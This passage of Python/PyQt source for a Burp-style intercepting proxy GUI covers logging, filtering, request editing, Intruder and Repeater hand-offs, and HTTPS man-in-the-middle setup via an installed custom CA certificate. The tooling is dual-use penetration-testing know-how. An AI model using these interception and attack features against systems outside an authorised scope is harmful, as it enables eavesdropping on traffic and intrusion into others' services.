        sp.addWidget(detail_w)
        sp.setSizes([500, 280])
        root.addWidget(sp, 1)

        # ── Bottom action bar ─────────────────────────────────────────────────
        bb = QWidget(); bb.setFixedHeight(34)
        bb.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};")
        bl = QHBoxLayout(bb); bl.setContentsMargins(8,0,8,0); bl.setSpacing(6)
        self._log_autoscroll_row, self._log_autoscroll = labeled_toggle("Auto-scroll", checked=True)
        self._log_autoscroll.toggled.connect(lambda on: setattr(self, '_autoscroll', on))
        clr_btn  = self._btn("🗑 Clear", "danger", h=26)
        exp_csv  = self._btn("📊 CSV",  h=26)
        exp_json = self._btn("📋 JSON", h=26)
        exp_har  = self._btn("🌐 HAR",  h=26)
        self._log_visible_lbl = QLabel("Showing 0 / 0")
        self._log_visible_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO}")
        bl.addWidget(self._log_autoscroll_row)
        bl.addSpacing(8)
        bl.addWidget(clr_btn)
        bl.addWidget(QLabel("Export:"))
        bl.addWidget(exp_csv); bl.addWidget(exp_json); bl.addWidget(exp_har)
        bl.addStretch()
        bl.addWidget(self._log_visible_lbl)
        root.addWidget(bb)

        # ── Wire signals ──────────────────────────────────────────────────────
        self._log_filter.textChanged.connect(self._logger_apply_filter)
        self._log_filter_regex.toggled.connect(self._logger_apply_filter)
        self._log_neg.toggled.connect(self._logger_apply_filter)
        self._log_m_filter.currentIndexChanged.connect(self._logger_apply_filter)
        self._log_s_filter.currentIndexChanged.connect(self._logger_apply_filter)
        self._log_ct_filter.currentIndexChanged.connect(self._logger_apply_filter)
        clr_filter_btn.clicked.connect(self._logger_clear_filter)
        clr_btn.clicked.connect(self._logger_clear_all)
        exp_csv.clicked.connect(self._export_csv)
        exp_json.clicked.connect(self._export_json)
        exp_har.clicked.connect(self._export_har)

        # Backfill from already-captured traffic
        self._logger_tbl.setSortingEnabled(False)
        for m in reversed(list(self.db.recent)):
            self._logger_add_row(m)
        self._logger_tbl.setSortingEnabled(True)
        self._logger_update_stats()
        return w

    def _logger_add_row(self, msg: dict):
        """Add one row to the Logger table. Safe to call before the tab is loaded."""
        if not hasattr(self, '_logger_tbl'):
            return
        r = self._logger_tbl.rowCount()
        self._logger_tbl.setSortingEnabled(False)
        self._logger_tbl.insertRow(r)
        ts  = datetime.datetime.fromtimestamp(msg.get("ts", time.time())).strftime("%H:%M:%S.%f")[:-3]
        st  = msg.get("status", 0)
        sz  = msg.get("resp_size", 0)
        dur = msg.get("dur", 0)
        ct  = msg.get("content_type", "")
        meth = msg.get("method","")
        vals = [str(r+1), ts, meth, msg.get("host",""),
                msg.get("path",""), str(st) if st else "ERR",
                pretty_size(sz), f"{dur:.3f}s", ct[:50]]
        for c, val in enumerate(vals):
            it = QTableWidgetItem(val)
            if c == 0:
                it.setData(Qt.ItemDataRole.UserRole, msg["id"])
            self._logger_tbl.setItem(r, c, it)
        # Row colour coding
        row_col = None
        if   st == 0:                row_col = "#ec489922"   # pink — connection error
        elif 200 <= st < 300:        row_col = None
        elif 300 <= st < 400:        row_col = "#3b82f614"   # blue tint — redirect
        elif 400 <= st < 500:        row_col = "#eab30820"   # yellow — client error
        elif 500 <= st < 600:        row_col = "#ef444425"   # red — server error
        if row_col:
            for c in range(self._logger_tbl.columnCount()):
                it = self._logger_tbl.item(r, c)
                if it: it.setBackground(QBrush(QColor(row_col)))
        # Method and status colour
        mc = {"GET":T.GREEN,"POST":T.YELLOW,"PUT":T.BLUE,"DELETE":T.RED,
              "PATCH":"#a855f7","HEAD":T.TXT3,"OPTIONS":T.TXT3}
        m_it = self._logger_tbl.item(r, 2)
        if m_it: m_it.setForeground(QBrush(QColor(mc.get(meth, T.TXT2))))
        s_it = self._logger_tbl.item(r, 5)
        if s_it: s_it.setForeground(QBrush(QColor(status_color(st))))
        self._logger_tbl.setSortingEnabled(True)
        if self._autoscroll:
            self._logger_tbl.scrollToBottom()
        if hasattr(self, '_log_stat_total'):
            self._logger_update_stats()
        self._logger_apply_filter()

    def _logger_update_stats(self):
        if not hasattr(self, '_log_stat_total'):
            return
        msgs = list(self.db.recent)
        total = len(msgs)
        c2 = sum(1 for m in msgs if 200 <= (m.get("status",0) or 0) < 300)
        c3 = sum(1 for m in msgs if 300 <= (m.get("status",0) or 0) < 400)
        c4 = sum(1 for m in msgs if 400 <= (m.get("status",0) or 0) < 500)
        c5 = sum(1 for m in msgs if 500 <= (m.get("status",0) or 0) < 600)
        ce = sum(1 for m in msgs if (m.get("status",0) or 0) == 0)
        tot_bytes = sum(m.get("resp_size",0) or 0 for m in msgs)
        self._log_stat_total.setText(f"{total} requests")
        self._log_stat_2xx.setText(f"2xx: {c2}")
        self._log_stat_3xx.setText(f"3xx: {c3}")
        self._log_stat_4xx.setText(f"4xx: {c4}")
        self._log_stat_5xx.setText(f"5xx: {c5}")
        self._log_stat_errors.setText(f"Errors: {ce}")
        self._log_stat_size.setText(f"{pretty_size(tot_bytes)} total")

    def _logger_clear_filter(self):
        self._log_filter.clear()
        self._log_m_filter.setCurrentIndex(0)
        self._log_s_filter.setCurrentIndex(0)
        self._log_ct_filter.setCurrentIndex(0)
        self._log_filter_regex.setChecked(False)
        self._log_neg.setChecked(False)

    def _logger_clear_all(self):
        reply = QMessageBox.question(self, "Clear Logger",
            "Clear all logged requests? (Traffic tree is unaffected)",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self._logger_tbl.setRowCount(0)
            self._logger_update_stats()

    def _logger_item_click2(self, current, _prev):
        if current is None:
            return
        self._logger_item_click(current)

    def _logger_item_click(self, item):
        row = item.row() if hasattr(item, 'row') else item
        id_item = self._logger_tbl.item(row if isinstance(row, int) else row, 0)
        if id_item is None:
            return
        mid = id_item.data(Qt.ItemDataRole.UserRole)
        if not mid:
            return
        msg = self.db.get_msg(mid)
        if not msg:
            return
        rh  = safe_json(msg.get("req_headers","{}"))
        req = f"{msg['method']} {msg['path']} HTTP/1.1\n"
        for k, v in rh.items():
            req += f"{k}: {v}\n"
        rb = msg.get("req_body")
        if rb:
            req += "\n" + decode_body(rb)
        self._log_req_view.setPlainText(req)
        sh   = safe_json(msg.get("resp_headers","{}"))
        resp = f"HTTP/1.1 {msg.get('status',0)}\n"
        for k, v in sh.items():
            resp += f"{k}: {v}\n"
        rsb = msg.get("resp_body")
        if rsb:
            resp += "\n" + decode_body(rsb)[:80000]
        self._log_resp_view.setPlainText(resp)
        # Summary tab
        ct     = sh.get("Content-Type", sh.get("content-type",""))
        enc    = sh.get("Content-Encoding","")
        cache  = sh.get("Cache-Control","")
        cors   = sh.get("Access-Control-Allow-Origin","")
        dur    = msg.get("dur",0)
        sz     = msg.get("resp_size",0)
        lines  = [
            f"URL          : {msg.get('url','')}",
            f"Method       : {msg.get('method','')}",
            f"Status       : {msg.get('status',0)}",
            f"Duration     : {dur:.3f}s",
            f"Size         : {pretty_size(sz)}",
            f"Content-Type : {ct}",
            f"Encoding     : {enc or '(none)'}",
            f"Cache-Control: {cache or '(none)'}",
            f"CORS         : {cors or '(none)'}",
            "",
            "── Request headers ──────────────────────────────────",
        ]
        for k, v in rh.items():
            lines.append(f"  {k}: {v}")
        lines += ["","── Response headers ─────────────────────────────────"]
        for k, v in sh.items():
            lines.append(f"  {k}: {v}")
        self._log_summary.setPlainText("\n".join(lines))

    def _logger_apply_filter(self):
        if not hasattr(self, '_logger_tbl'):
            return
        pattern   = self._log_filter.text().strip()
        method_f  = self._log_m_filter.currentText()
        status_f  = self._log_s_filter.currentText()
        ct_f      = self._log_ct_filter.currentText()
        negate    = self._log_neg.isChecked()
        use_regex = self._log_filter_regex.isChecked()
        visible = total = 0
        for row in range(self._logger_tbl.rowCount()):
            total += 1
            def _cell(c):
                it = self._logger_tbl.item(row, c)
                return it.text() if it else ""
            method = _cell(2); host = _cell(3); path = _cell(4)
            status = _cell(5); ct   = _cell(8)
            show = True
            if method_f != "All Methods" and method != method_f:
                show = False
            if show and status_f != "All Status":
                if status_f == "0 (error)":
                    show = (status in ("0","ERR",""))
                else:
                    try:
                        lo = int(status_f[0]) * 100
                        show = lo <= int(status) < lo + 100
                    except Exception:
                        show = False
            if show and ct_f != "All Types":
                ct_map = {
                    "JSON":"json","HTML":"html","XML":"xml",
                    "JavaScript":"javascript","CSS":"css",
                    "Image":("image","png","jpg","gif","webp","svg"),
                }
                ct_lo = ct.lower()
                targets = ct_map.get(ct_f, (ct_f.lower(),))
                if isinstance(targets, str): targets = (targets,)
                show = any(t in ct_lo for t in targets)
                if ct_f == "Other":
                    known = ("json","html","xml","javascript","css","image","png","jpg","gif","svg")
                    show  = not any(k in ct_lo for k in known)
            if show and pattern:
                haystack = " ".join([host, path, status, ct])
                try:
                    matched = (bool(re.search(pattern, haystack, re.IGNORECASE))
                               if use_regex else pattern.lower() in haystack.lower())
                except Exception:
                    matched = False
                show = (not matched) if negate else matched
            self._logger_tbl.setRowHidden(row, not show)
            if show: visible += 1
        if hasattr(self, '_log_visible_lbl'):
            self._log_visible_lbl.setText(f"Showing {visible} / {total}")

    def _logger_ctx(self, pos):
        item = self._logger_tbl.itemAt(pos)
        if not item:
            return
        row = item.row()
        id_it = self._logger_tbl.item(row, 0)
        if not id_it:
            return
        mid = id_it.data(Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        menu = QMenu()
        a_rep   = menu.addAction("🔁 Send to Repeater")
        a_int   = menu.addAction("💣 Send to Intruder")
        a_scan  = menu.addAction("🔍 Send URL to Scanner")
        menu.addSeparator()
        a_curl  = menu.addAction("📋 Copy as cURL")
        a_url   = menu.addAction("🔗 Copy URL")
        a_req   = menu.addAction("📤 Copy Request (raw)")
        a_resp  = menu.addAction("📥 Copy Response (raw)")
        menu.addSeparator()
        a_open  = menu.addAction("🌐 Open in Browser")
        a_del   = menu.addAction("🗑 Remove Row")
        action  = menu.exec(self._logger_tbl.viewport().mapToGlobal(pos))
        if action == a_rep:
            self._send_to_rep(msg)
        elif action == a_int:
            self._send_to_int(msg)
        elif action == a_scan:
            self.scan_url.setText(msg.get("url",""))
            self.tabs.setCurrentIndex(4)
        elif action == a_curl:
            QApplication.clipboard().setText(self._to_curl(msg))
        elif action == a_url:
            QApplication.clipboard().setText(msg.get("url",""))
        elif action == a_req:
            rh  = safe_json(msg.get("req_headers","{}"))
            raw = f"{msg['method']} {msg['path']} HTTP/1.1\n"
            for k, v in rh.items(): raw += f"{k}: {v}\n"
            rb = decode_body(msg.get("req_body",""))
            if rb: raw += "\n" + rb
            QApplication.clipboard().setText(raw)
        elif action == a_resp:
            sh   = safe_json(msg.get("resp_headers","{}"))
            raw  = f"HTTP/1.1 {msg.get('status',0)}\n"
            for k, v in sh.items(): raw += f"{k}: {v}\n"
            rsb  = decode_body(msg.get("resp_body",""))
            if rsb: raw += "\n" + rsb[:60000]
            QApplication.clipboard().setText(raw)
        elif action == a_open:
            webbrowser.open(msg.get("url",""))
        elif action == a_del:
            self._logger_tbl.removeRow(row)

    # ---------- Settings ----------
    def _settings_tab(self):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        c = QWidget()
        cv = QVBoxLayout(c)

        ca_g = QGroupBox("CA Certificate — HTTPS MITM")
        ca_l = QVBoxLayout(ca_g)
        ca_info = QLabel(
            "① Click  🔐 Generate CA Certificate  below\n"
            "② Cert is saved to:  ~/kingception/kingception-ca.crt\n"
            "\n"
            "FIREFOX:\n"
            "  Settings → Privacy & Security → Certificates → View Certificates\n"
            "  Authorities tab → Import → select ~/kingception/kingception-ca.crt\n"
            "  ☑ Trust this CA to identify websites → OK\n"
            "\n"
            "CHROME / CHROMIUM:\n"
            "  Settings → Privacy → Security → Manage certificates\n"
            "  Authorities tab → Import → select ~/kingception/kingception-ca.crt\n"
            "  ☑ Trust for identifying websites → OK\n"
            "\n"
            "KALI SYSTEM-WIDE (optional):\n"
            "  sudo cp ~/kingception/kingception-ca.crt /usr/local/share/ca-certificates/kingception-ca.crt\n"
            "  sudo update-ca-certificates\n"
            "\n"
            "⑤ Configure browser proxy → HTTP 127.0.0.1:8080\n"
            "⑥ HTTPS traffic now fully intercepted — body included ✅")
        ca_info.setStyleSheet(f"color:{T.TXT2};padding:12px;border-radius:8px;background:{T.SURFACE};"
                              f"font-family:{T.MONO};font-size:11px")
        ca_info.setWordWrap(True)
        ca_l.addWidget(ca_info)
        self.ca_lbl = QLabel()
        ca_p = Path.home() / 'kingception' / 'kingception-ca.crt'
        if ca_p.exists():
            self.ca_lbl.setText(f"✅ {ca_p}")
            self.ca_lbl.setStyleSheet(f"color:{T.GREEN}")
        else:
            self.ca_lbl.setText("⚠ No CA yet")
            self.ca_lbl.setStyleSheet(f"color:{T.YELLOW}")
        ca_l.addWidget(self.ca_lbl)
        gen_btn = self._btn("🔐 Generate CA Certificate", "primary", h=36)
        gen_btn.clicked.connect(self._gen_ca)
        ca_l.addWidget(gen_btn)

        ca_btns = QHBoxLayout()
        open_btn = self._btn("📂 Open ~/kingception Folder", None, h=32)
        copy_btn = self._btn("📋 Copy Cert Path", None, h=32)
        open_btn.clicked.connect(lambda: __import__('subprocess').Popen(
            ['xdg-open', str(Path.home() / 'kingception')]))
        copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(
            str(Path.home() / 'kingception' / 'kingception-ca.crt')))
        ca_btns.addWidget(open_btn)
        ca_btns.addWidget(copy_btn)
        ca_btns.addStretch()
        ca_l.addLayout(ca_btns)
        cv.addWidget(ca_g)

        mr_g = QGroupBox("Match & Replace Rules")
        mr_l = QVBoxLayout(mr_g)
        self.rules_tbl = QTableWidget(0, 6)
        self.rules_tbl.setHorizontalHeaderLabels(["Name", "Pattern", "Replace", "Apply To", "Scope", "Regex"])
        self.rules_tbl.horizontalHeader().setStretchLastSection(True)
        self.rules_tbl.setFixedHeight(160)
        mr_l.addWidget(self.rules_tbl)
        rb = QHBoxLayout()
        add_r = self._btn("➕ Add Rule", h=28)
        add_r.clicked.connect(self._add_rule)
        del_r = self._btn("🗑 Delete", "danger", h=28)
        del_r.clicked.connect(self._del_rule)
        rb.addWidget(add_r)
        rb.addWidget(del_r)
        rb.addStretch()
        mr_l.addLayout(rb)
        cv.addWidget(mr_g)

        sc_g = QGroupBox("Scope (prefix ! to exclude)")
        sc_l = QVBoxLayout(sc_g)
        self.scope_edit = QPlainTextEdit()
        self.scope_edit.setFont(mono_font(10))
        self.scope_edit.setPlaceholderText("example.com\ntarget.com/api\n!cdn.example.com")
        self.scope_edit.setMaximumHeight(90)
        sc_l.addWidget(self.scope_edit)
        sv = self._btn("💾 Save Scope", h=28)
        sv.clicked.connect(self._save_scope)
        sc_l.addWidget(sv)
        cv.addWidget(sc_g)

        exp_g = QGroupBox("Export / Import")
        exp_l = QHBoxLayout(exp_g)
        for label, fn in [("HAR", self._export_har), ("JSON", self._export_json),
                          ("CSV", self._export_csv), ("cURL", self._export_curl),
                          ("Import JSON", self._import_json)]:
            b = self._btn(label, h=30)
            b.clicked.connect(fn)
            exp_l.addWidget(b)
        exp_l.addStretch()
        cv.addWidget(exp_g)

        log_g = QGroupBox("Console Log")
        ll = QVBoxLayout(log_g)
        self.log_box = QPlainTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setFont(mono_font(10))
        self.log_box.setMaximumBlockCount(3000)
        ll.addWidget(self.log_box)
        cv.addWidget(log_g)

        cv.addStretch()
        scroll.setWidget(c)
        return scroll

    # ---------- Intercept Context Menu (Rich Actions) ----------
    def _ic_editor_ctx(self, pos):
        if not self._cur_req_pi:
            return
        menu = QMenu()

        # --- Send to ---
        send_menu = menu.addMenu("📤 Send To")
        a_rep  = send_menu.addAction("🔁 Repeater")
        a_int  = send_menu.addAction("💣 Intruder")
        menu.addSeparator()

        # --- Request editing ---
        a_method   = menu.addAction("🔄 Change Request Method")
        a_headers  = menu.addAction("✏ Edit Headers (table)")
        a_beautify = menu.addAction("✨ Beautify Body (JSON/XML)")
        menu.addSeparator()

        # --- Copy ---
        copy_menu  = menu.addMenu("📋 Copy")
        a_copy_url = copy_menu.addAction("Copy URL")
        a_curl     = copy_menu.addAction("Copy as cURL")
        a_copy_req = copy_menu.addAction("Copy Request Raw")
        a_python   = copy_menu.addAction("Copy as Python requests")
        menu.addSeparator()

        # --- Scope / note ---
        a_scope = menu.addAction("✅ Add Host to Scope")
        a_note  = menu.addAction("📝 Note for this request")
        menu.addSeparator()

        # --- PoC / tools ---
        a_open = menu.addAction("🌐 Open URL in Browser")
        a_save = menu.addAction("💾 Save Request to File")

        action = menu.exec(self.ic_editor.viewport().mapToGlobal(pos))
        if not action:
            return
        raw = self.ic_editor.toPlainText()
        pr  = self._cur_req_pi
        headers, body = self._parse_raw_request(raw)

        if action == a_rep:
            self._add_rep_tab(title=pr.url[:28], method=pr.method, url=pr.url,
                              raw_request=raw)
            self.tabs.setCurrentIndex(2)
        elif action == a_int:
            self.intr_url.setText(pr.url)
            self.intr_method.setCurrentText(pr.method)
            self.intr_headers.setPlainText("\n".join(f"{k}: {v}" for k, v in headers.items()))
            self.intr_body.setPlainText(decode_body(body) or '{"key":"§PAYLOAD§"}')
            self.tabs.setCurrentIndex(3)
            self._log("Sent to Intruder — add §PAYLOAD§ then Start Attack")
        elif action == a_method:
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
            new_method, ok = QInputDialog.getItem(self, "Change Method", "Select new method:", methods, 0, False)
            if ok and new_method:
                lines = raw.split("\n")
                if lines and lines[0].split()[0].upper() in ("GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"):
                    parts = lines[0].split()
                    if len(parts) >= 2:
                        parts[0] = new_method
                        lines[0] = " ".join(parts)
                        self.ic_editor.setPlainText("\n".join(lines))
        elif action == a_headers:
            d = QDialog(self)
            d.setWindowTitle("Edit Headers")
            d.resize(640, 420)
            layout = QVBoxLayout(d)
            tbl = QTableWidget(0, 2)
            tbl.setHorizontalHeaderLabels(["Name", "Value"])
            tbl.horizontalHeader().setStretchLastSection(True)
            add_row_btn = QPushButton("➕ Add Row")
            add_row_btn.clicked.connect(lambda: tbl.insertRow(tbl.rowCount()))
            layout.addWidget(add_row_btn)
            for k, v in headers.items():
                row2 = tbl.rowCount()
                tbl.insertRow(row2)
                tbl.setItem(row2, 0, QTableWidgetItem(k))
                tbl.setItem(row2, 1, QTableWidgetItem(v))
            layout.addWidget(tbl)
            btn_box = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
            btn_box.accepted.connect(d.accept)
            btn_box.rejected.connect(d.reject)
            layout.addWidget(btn_box)
            if d.exec() == QDialog.DialogCode.Accepted:
                new_headers = {}
                for row2 in range(tbl.rowCount()):
                    name2  = tbl.item(row2, 0).text() if tbl.item(row2, 0) else ""
                    value2 = tbl.item(row2, 1).text() if tbl.item(row2, 1) else ""
                    if name2.strip():
                        new_headers[name2.strip()] = value2.strip()
                lines = raw.split("\n")
                header_end = 0
                for i, line in enumerate(lines):
                    if not line.strip():
                        header_end = i
                        break
                new_lines = lines[:1]
                for k, v in new_headers.items():
                    new_lines.append(f"{k}: {v}")
                new_lines.append("")
                if header_end + 1 < len(lines):
                    new_lines.extend(lines[header_end + 1:])
                self.ic_editor.setPlainText("\n".join(new_lines))
        elif action == a_beautify:
            body_str = decode_body(body)
            try:
                parsed = json.loads(body_str)
                pretty = json.dumps(parsed, indent=2)
                lines = raw.split("\n")
                header_end = next((i for i, l in enumerate(lines) if not l.strip()), len(lines))
                new_lines = lines[:header_end + 1] + [pretty]
                self.ic_editor.setPlainText("\n".join(new_lines))
                self._log("Body beautified as JSON")
            except Exception:
                try:
                    import xml.dom.minidom as minidom
                    dom = minidom.parseString(body_str.encode())
                    pretty = dom.toprettyxml(indent="  ")
                    lines = raw.split("\n")
                    header_end = next((i for i, l in enumerate(lines) if not l.strip()), len(lines))
                    new_lines = lines[:header_end + 1] + [pretty]
                    self.ic_editor.setPlainText("\n".join(new_lines))
                    self._log("Body beautified as XML")
                except Exception:
                    QMessageBox.information(self, "Beautify", "Body is not valid JSON or XML")
        elif action == a_copy_url:
            QApplication.clipboard().setText(pr.url)
            self._log("URL copied")
        elif action == a_curl:
            import shlex
            curl = f"curl -X {pr.method} {shlex.quote(pr.url)}"
            for k, v in headers.items():
                if k.lower() != "content-length":
                    curl += f" \\\n  -H {shlex.quote(f'{k}: {v}')}"
            if body:
                curl += f" \\\n  -d {shlex.quote(decode_body(body))}"
            curl += " \\\n  -k"
            QApplication.clipboard().setText(curl)
            self._log("cURL copied")
        elif action == a_copy_req:
            QApplication.clipboard().setText(raw)
            self._log("Raw request copied")
        elif action == a_python:
            h_repr = repr({k: v for k, v in headers.items() if k.lower() != "content-length"})
            body_str = decode_body(body)
            code = (
                "import requests\n\n"
                f"url = {repr(pr.url)}\n"
                f"headers = {h_repr}\n"
                + (f"data = {repr(body_str)}\n\n" if body_str else "\n")
                + f"response = requests.{pr.method.lower()}(\n"
                "    url, headers=headers,"
                + (" data=data," if body_str else "")
                + " verify=False\n)\nprint(response.status_code, response.text[:500])\n"
            )
            QApplication.clipboard().setText(code)
            self._log("Python snippet copied")
        elif action == a_scope:
            host = urlparse(pr.url).hostname or ""
            if host:
                lines = self.scope_edit.toPlainText().strip().split("\n")
                if host not in lines:
                    lines.append(host)
                    self.scope_edit.setPlainText("\n".join(lines))
                    self._save_scope()
                    self._log(f"Added to scope: {host}")
        elif action == a_note:
            mid = pr.mid
            current = self._msg_notes.get(mid, "")
            note, ok = QInputDialog.getMultiLineText(self, "Note", "Add a note:", current)
            if ok:
                self._msg_notes[mid] = note
        elif action == a_open:
            webbrowser.open(pr.url)
        elif action == a_save:
            path, _ = QFileDialog.getSaveFileName(self, "Save Request", "request.txt", "Text (*.txt)")
            if path:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(raw)
                self._log(f"Request saved: {path}")

    def _parse_raw_request(self, raw: str) -> Tuple[dict, Optional[bytes]]:
        # Normalise line endings — QPlainTextEdit may use \r\n on some platforms
        raw = raw.replace('\r\n', '\n').replace('\r', '\n')
        lines = raw.split('\n')
        headers: dict = {}
        body_start: int = len(lines)          # sentinel = "no blank line found"

        # Parse header lines (skip line 0 = request-line)
        for i, line in enumerate(lines[1:], start=1):
            if line.strip() == '':            # blank line = end of headers
                body_start = i + 1
                break
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()

        # Anything after the blank line is the body
        if body_start < len(lines):
            # Real CRLF between body lines — matches actual HTTP wire
            # semantics. Without this, a deliberately multi-line raw body
            # (e.g. a request-smuggling test payload embedding what looks
            # like a second request) gets sent with bare LF internally,
            # undercounting Content-Length by 1 byte per internal line
            # break compared to what a real client — or Burp — sends.
            # Safe for ordinary single-line bodies (JSON/form/etc.) since
            # there's nothing to join when there's only one line, and safe
            # for pretty-printed multi-line JSON/XML since both formats
            # treat \r\n and \n as equivalent whitespace.
            body_text = '\r\n'.join(lines[body_start:])
            # Only treat as None if there is genuinely nothing there
            body: Optional[bytes] = body_text.encode('utf-8', 'replace') if body_text else None
        else:
            body = None

        return headers, body

    # ---------- Signal Connections ----------
    def _connect_backend_signals(self):
        """Connections from PERSISTENT backend objects (proxy, intercept,
        collaborator) to bound methods on self. These backend objects are
        never destroyed or recreated — including when the UI is rebuilt for
        a theme change — so this must run EXACTLY ONCE per app launch.
        Re-running it would stack duplicate connections and cause every
        proxied message / OOB interaction to be processed multiple times."""
        self.intercept.req_captured.connect(self._on_req_captured)
        self.proxy.msg_received.connect(self._on_msg)
        self.proxy.err.connect(self._on_proxy_err)
        self.proxy.started.connect(self._on_proxy_started)
        self._collab.interaction.connect(self._on_collab_interaction)
        self._collab.log.connect(lambda m: self._log(f"[Collaborator] {m}"))

    def _connect_widget_signals(self):
        """Connections that involve widgets rebuilt by _build_ui() — safe (and
        necessary) to call every time _build_ui() runs, including after a
        theme-toggle UI rebuild, since these widgets are freshly constructed
        each time and start with zero connections."""
        self.ic_btn.toggled.connect(self._toggle_intercept)
        self.ic_fwd.clicked.connect(self._ic_forward)
        self.ic_drop.clicked.connect(self._ic_drop)
        self.ic_req_filter.textChanged.connect(
            lambda txt: setattr(self.proxy, '_intercept_url_filter', txt.strip()))
        self.search_box.textChanged.connect(self._filter_proxy_tree)
        self.f_method.currentTextChanged.connect(self._filter_proxy_tree)
        self.f_status.currentTextChanged.connect(self._filter_proxy_tree)
        self.clear_btn.clicked.connect(self._clear)
        self.export_btn.clicked.connect(self._quick_export)
        # proxy_tree click/ctx already connected inside _traffic_tab

    # ---------- Intercept Control ----------
    def _toggle_intercept(self, on: bool):
        self.intercept.toggle(on)
        self.ic_btn_label.setText(f"Intercept {'ON' if on else 'OFF'}")
        self.ic_btn_label.setStyleSheet(
            f"color:{T.GREEN if on else T.TXT2};font-size:12px;font-weight:700;")
        if on:
            self.ic_banner.setText("  ● Intercept ON — requests will pause in the queue above")
            self.ic_banner.setStyleSheet(
                f"background:{T.GREEN}18;color:{T.GREEN};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")
        else:
            self.ic_banner.setText("  Intercept is OFF")
            self.ic_banner.setStyleSheet(
                f"background:{T.SURFACE};color:{T.TXT3};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.BORDER};")
            if hasattr(self, '_ic_queue'):
                self._ic_queue.clear()
                self.ic_queue_tbl.setRowCount(0)
                self.ic_queue_lbl.setText("0 queued")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all,
                   self.ic_beautify_btn, self.ic_action_btn]:
            _b.setEnabled(False)
        self._log(f"Intercept {'ON' if on else 'OFF'}")

    def _on_req_captured(self, pi):
        """Called from background thread via signal — add to queue table."""
        self.tabs.setCurrentIndex(1)   # Switch to Intercept tab
        row = self._ic_queue_add(pi)
        # Auto-select if it's the first/only item
        if self.ic_queue_tbl.currentRow() < 0:
            self.ic_queue_tbl.setCurrentCell(row, 0)
        self.ic_banner.setText(
            f"  ● {self.ic_queue_tbl.rowCount()} request(s) intercepted — "
            f"select a row and click Forward or Drop")
        self.ic_banner.setStyleSheet(
            f"background:{T.YELLOW}18;color:{T.YELLOW};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.YELLOW}44;")
        for _b in [self.ic_fwd_all, self.ic_drop_all]:
            _b.setEnabled(True)

    def _ic_forward(self):
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        tab = self.ic_view_tabs.currentIndex()
        if tab == 2:
            self._ic_replace_body_in_raw(self.ic_editor.toPlainText(),
                                         self.ic_body_edit.toPlainText())
        raw = self.ic_editor.toPlainText()
        headers, body = self._parse_raw_request(raw)
        if tab == 2:
            bt = self.ic_body_edit.toPlainText()
            body = bt.encode('utf-8','replace') if bt else None
        self.intercept.forward(pi.mid, headers or None, body)
        self._ic_queue_remove_row_by_mid(pi.mid)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_cl_live.setText("0 B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(False)
        if self.ic_queue_tbl.rowCount() == 0:
            self.ic_banner.setText("  ✅ All requests forwarded")
            self.ic_banner.setStyleSheet(
                f"background:{T.GREEN}18;color:{T.GREEN};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")

    def _ic_drop(self):
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        self.intercept.drop(pi.mid)
        self._ic_queue_remove_row_by_mid(pi.mid)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_cl_live.setText("0 B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(False)
        if self.ic_queue_tbl.rowCount() == 0:
            self.ic_banner.setText("  ❌ Request dropped")
            self.ic_banner.setStyleSheet(
                f"background:{T.RED}18;color:{T.RED};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.RED}44;")
        if not self._cur_req_pi:
            return
        tab = self.ic_view_tabs.currentIndex()
        if tab == 2:
            self._ic_replace_body_in_raw(self.ic_editor.toPlainText(),
                                         self.ic_body_edit.toPlainText())
        raw = self.ic_editor.toPlainText()
        headers, body = self._parse_raw_request(raw)
        if tab == 2:
            body_txt = self.ic_body_edit.toPlainText()
            body = body_txt.encode('utf-8','replace') if body_txt else None
        self.intercept.forward(self._cur_req_pi.mid, headers or None, body)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_banner.setText("  ✅ Request forwarded")
        self.ic_banner.setStyleSheet(
            f"background:{T.GREEN}15;color:{T.GREEN};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")
        # # self.ic_info_lbl.setText(""); self.ic_method_lbl.setText("")  # removed widget  # removed widget
        # self.ic_url_lbl.setText(""); self.ic_cl_live.setText("0 B")  # removed widget
        for b in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all,
                  self.ic_beautify_btn, self.ic_action_btn]:
            b.setEnabled(False)

    # ---------- Proxy Tree Handling ----------
    def _on_msg(self, msg: dict):
        # Logger tab row
        self._logger_add_row(msg)

        n = self.proxy_tree.topLevelItemCount() + 1
        item = QTreeWidgetItem()
        item.setText(0, str(n))
